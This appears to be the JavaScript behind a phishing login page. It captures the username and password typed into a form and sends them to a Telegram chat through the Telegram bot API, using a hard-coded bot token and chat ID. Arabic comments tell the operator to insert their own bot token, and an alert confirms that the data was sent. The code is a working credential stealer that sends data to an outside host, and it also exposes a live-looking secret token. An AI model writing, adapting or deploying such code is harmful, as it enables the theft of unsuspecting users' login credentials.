document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const botToken = '8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y'; // ضع رمز بوت تيليجرام هنا
    const chatId = '7302541527'; // ضع معرف الشات الخاص بك هنا

    const message = `🔐 تسجيل دخول جديد:\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert('تم تسجيل الدخول وإرسال البيانات إلى تيليجرام!');
                window.location.href = 'index.html';
            } else {
                alert('حدث خطأ أثناء إرسال البيانات.');
            }
        })
        .catch(error => console.error('Error:', error));
});
